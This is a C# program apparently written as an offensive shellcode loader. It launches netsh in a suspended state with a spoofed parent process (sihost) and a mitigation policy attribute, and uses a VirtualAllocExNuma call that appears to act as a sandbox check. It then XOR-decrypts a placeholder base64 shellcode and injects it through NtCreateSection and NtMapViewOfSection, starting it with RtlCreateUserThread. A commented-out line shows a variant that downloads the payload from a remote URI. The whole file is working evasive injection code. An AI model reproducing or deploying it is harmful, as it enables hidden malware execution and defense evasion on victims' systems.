using System;
using System.Diagnostics;
using System.Runtime.InteropServices;


namespace Inject
{
    class Program
    {        
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int
       processId);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern IntPtr RtlCreateUserThread(IntPtr processHandle, IntPtr threadSecurity, 
            bool createSuspended, Int32 stackZeroBits, 
            IntPtr stackReserved, IntPtr stackCommit, IntPtr startAddress,
            IntPtr parameter, ref IntPtr threadHandle, IntPtr clientId);

        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
            static extern UInt32 NtCreateSection(
         ref IntPtr SectionHandle,
         UInt32 DesiredAccess,
         IntPtr ObjectAttributes,
         ref UInt32 MaximumSize,
         UInt32 SectionPageProtection,
         UInt32 AllocationAttributes,
         IntPtr FileHandle);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtMapViewOfSection(
        IntPtr SectionHandle,
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        UIntPtr ZeroBits,
        UIntPtr CommitSize,
        out ulong SectionOffset,
        out uint ViewSize,
        uint InheritDisposition,
        uint AllocationType,
        uint Win32Protect);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress,
 uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hHandle);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

        [DllImport("kernel32.dll")]
        public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool DeleteProcThreadAttributeList(IntPtr lpAttributeList);

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO
        {
            public uint cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttributes;
            public uint dwFlags;
            public ushort wShowWindow;
            public ushort cbReserved;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdErr;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }
        static void Main(string[] args)
        {

           
            IntPtr hCurrentProcess = OpenProcess(0x001F0FFF, false, Process.GetCurrentProcess().Id);
            IntPtr mem = VirtualAllocExNuma(hCurrentProcess, IntPtr.Zero, 0x1000, 0x3000, 0x4,0);
            if (mem == null)
            {
                return;
            }

            var startInfoEx = new STARTUPINFOEX();
            var processInfo = new PROCESS_INFORMATION();

            startInfoEx.StartupInfo.cb = (uint)Marshal.SizeOf(startInfoEx);

            var lpValue = Marshal.AllocHGlobal(IntPtr.Size);

            try
            {
                var processSecurity = new SECURITY_ATTRIBUTES();
                var threadSecurity = new SECURITY_ATTRIBUTES();
                processSecurity.nLength = Marshal.SizeOf(processSecurity);
                threadSecurity.nLength = Marshal.SizeOf(threadSecurity);

                var lpSize = IntPtr.Zero;
                InitializeProcThreadAttributeList(IntPtr.Zero, 2, 0, ref lpSize);
                startInfoEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
                InitializeProcThreadAttributeList(startInfoEx.lpAttributeList, 2, 0, ref lpSize);
                
                Marshal.WriteIntPtr(lpValue, new IntPtr((long)0x300000000000));

                UpdateProcThreadAttribute(
                    startInfoEx.lpAttributeList,
                    0,
                    (IntPtr)0x20007,
                    lpValue,
                    (IntPtr)IntPtr.Size,
                    IntPtr.Zero,
                    IntPtr.Zero
                    );
                
                var parentHandle = Process.GetProcessesByName("sihost")[0].Handle;
                lpValue = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(lpValue, parentHandle);

                UpdateProcThreadAttribute(
                    startInfoEx.lpAttributeList,
                    0,
                    (IntPtr)0x00020000,
                    lpValue,
                    (IntPtr)IntPtr.Size,
                    IntPtr.Zero,
                    IntPtr.Zero
                    );

                CreateProcess(
                    null,
                    "netsh",
                    ref processSecurity,
                    ref threadSecurity,
                    false,
                    (uint)(0x00000004 | 0x00080000 | 0x00000008),
                    IntPtr.Zero,
                    null,
                    ref startInfoEx,
                    out processInfo
                    );
            }
            catch (Exception e)
            {
            }
            finally
            {
                DeleteProcThreadAttributeList(startInfoEx.lpAttributeList);
                Marshal.FreeHGlobal(startInfoEx.lpAttributeList);
                Marshal.FreeHGlobal(lpValue);
            }

            
            IntPtr hTargetProcess = processInfo.hProcess;
            //WebClient wc = new WebClient();

            //byte[] buf = Convert.FromBase64String(wc.DownloadString(URI));

            byte[] buf = Convert.FromBase64String("##BASE64SHELLCODE##");
            byte[] key = Convert.FromBase64String("##BASE64KEY##");
            int k = 0;
            for (int i = 0; i < buf.Length; i++)
            {
                if (k == key.Length)
                {
                    k = 0;
                }
                buf[i] = (byte)((int)buf[i] ^ (int)key[k]);
                k++;
            }
            IntPtr SectionHandle = IntPtr.Zero;
            uint maxSize = (uint)(buf.Length + (4096 - buf.Length%4096));
            
            uint res = NtCreateSection(ref SectionHandle,
                0x0002 | 0x0004 | 0x0008, IntPtr.Zero
                ,ref maxSize, 0x40, 0x08000000, IntPtr.Zero);


            IntPtr currentBaseAddress = IntPtr.Zero;
            ulong sectionOffset = 0;
            uint viewSize = 0;

            res = NtMapViewOfSection(SectionHandle,
                hCurrentProcess,
                ref currentBaseAddress,
                UIntPtr.Zero,
                UIntPtr.Zero,
                out sectionOffset,
                out viewSize,
                2,
                0,
                0x04
                );
            
            Marshal.Copy(buf, 0, currentBaseAddress, buf.Length);

            IntPtr targetBaseAddress = IntPtr.Zero;
            
            res = NtMapViewOfSection(SectionHandle,
                hTargetProcess,
                ref targetBaseAddress,
                UIntPtr.Zero,
                UIntPtr.Zero,
                out sectionOffset,
                out viewSize,
                2,
                0,
                0x20
                );
            IntPtr hRemoteThread = IntPtr.Zero;
            IntPtr res2 = RtlCreateUserThread(hTargetProcess, IntPtr.Zero, false, 0,
                IntPtr.Zero, IntPtr.Zero,
                targetBaseAddress, IntPtr.Zero, ref hRemoteThread, IntPtr.Zero);
            CloseHandle(processInfo.hProcess);
            CloseHandle(processInfo.hThread);
        }
    }
}

